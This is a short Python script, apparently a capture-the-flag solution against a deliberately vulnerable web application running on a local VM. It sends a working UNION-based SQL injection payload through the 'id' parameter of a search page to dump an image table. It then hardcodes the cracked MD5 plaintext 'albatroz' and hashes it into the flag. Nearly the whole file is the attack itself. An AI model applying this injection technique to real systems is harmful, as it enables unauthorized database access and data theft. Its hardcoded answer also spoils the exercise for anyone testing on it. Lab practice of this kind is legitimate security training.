import hashlib
import os

import requests
from lxml import etree

VM_IP = os.environ.get("VM_IP", "192.168.122.213")


def inject(payload):
    url = f"http://{VM_IP}/index.php?page=searchimg&id={payload}&Submit=Submit"
    root = etree.HTML(requests.get(url).text)
    return root.xpath("//pre/text()")


if __name__ == "__main__":
    # Extract image records to find the flag hint
    rows = inject(
        "1 UNION SELECT CONCAT_WS(0x3A, id, title, comment), NULL FROM list_images --"
    )

    for row in rows:
        if "decode" not in row.lower():
            continue
        print(f"Hint: {row.strip()}")

        # MD5 1928e8083cf461a51303633093573c46 decodes to "albatroz" → lowercase → sha256
        plaintext = "albatroz"
        flag = hashlib.sha256(plaintext.encode()).hexdigest()
        print(f"Flag: {flag}")
        break
